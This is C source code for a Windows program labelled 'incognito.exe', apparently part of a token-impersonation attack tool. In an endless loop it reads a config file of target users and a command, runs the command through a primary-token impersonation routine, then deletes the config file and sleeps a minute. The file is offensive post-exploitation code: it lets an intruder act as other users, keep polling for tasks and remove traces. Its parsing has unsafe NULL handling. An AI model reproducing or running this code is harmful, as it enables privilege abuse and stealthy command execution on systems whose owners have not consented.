#define _CRT_SECURE_NO_DEPRECATE 1
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "process_execution.h"

void parse_config(char* filename) {
	// read file
	HANDLE fh = CreateFile(
		filename,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (fh == INVALID_HANDLE_VALUE) {
		return;
	}
	DWORD file_size = GetFileSize(fh, NULL);
	DWORD bytes_read = 0;
	char* file_contents = (char*)calloc(file_size + 1, sizeof(char));	
	if (!ReadFile(fh, file_contents, file_size, &bytes_read, NULL)) {
		CloseHandle(fh);
		return;
	}
	CloseHandle(fh);

	// parse config items
	char* targets_loc = strstr(file_contents, "targets:") + strlen("targets:");
	char* command_loc = strstr(file_contents, "command:") + strlen("command:");
	char* hosts_loc = strstr(file_contents, "hosts:") + strlen("hosts:");

	// tokenize input
	char* ptr = strtok(file_contents, "\r\n");
	while (ptr != NULL) {
		ptr = strtok(NULL, "\r\n");
	}

	// look for targets
	DWORD num_targets = 0;
	char** targets = (char**)calloc(1, sizeof(char*));
	if (targets_loc != NULL) {
		num_targets++;
		// get number of targets		
		for (int i = 0; i < strlen(targets_loc); i++) {
			if (targets_loc[i] == ',') {
				num_targets++;
			}
		}
		// get targets
		if (targets != NULL) {
			free(targets);
			targets = NULL;
		}
		targets = (char**)calloc(num_targets, sizeof(char*));
		char* t = strtok(targets_loc, ",");
		DWORD ti = 0;
		while (t != NULL) {
			targets[ti] = t;
			t = strtok(NULL, ",");
			ti++;
		}
		// remove leading spaces
		for (size_t j = 0; j < ti; j++) {
			size_t sl = strlen(targets[j]);
			for (size_t index = 0; index < sl; index++) {
				if (targets[j][index] == ' ') {
					memmove(&targets[j][index], &targets[j][index + 1], sl - index);
					index--;
				}
				else {
					break;
				}
			}
		}
		// remove trailing spaces
		for (size_t j = 0; j < ti; j++) {
			size_t sl = strlen(targets[j]);
			for (size_t index = sl - 1; index > 0; index--) {
				if (targets[j][index] == ' ') {
					targets[j][index] = '\0';
				}
				else {
					break;
				}
			}
		}
	}
	// look for command
	if (command_loc != NULL) {
		// remove leading spaces
		size_t sl = strlen(command_loc);
		for (size_t index = 0; index < sl; index++) {
			if (command_loc[index] == ' ') {
				memmove(&command_loc[index], &command_loc[index + 1], sl - index);
				index--;
			}
			else {
				break;
			}
		}
		// remove trailing spaces
		for (size_t index = sl - 1; index > 0; index--) {
			if (command_loc[index] == ' ') {
				command_loc[index] = '\0';
			}
			else {
				break;
			}
		}
	}
	// do it!
	if (strlen(command_loc) > 0 && num_targets > 0) {
		execute_process_with_primary_token(targets, num_targets, command_loc, TRUE);
	}
	
	// cleanup
	free(file_contents);
}

int main(int argc, char *argv[])
{
	// usage: incognito.exe <config file>
	if (argc != 2) {
		return 0;
	}
	
	while (TRUE) {
		parse_config(argv[1]);
		DeleteFile(argv[1]);
		Sleep(60000);
	}

	exit(0);
}
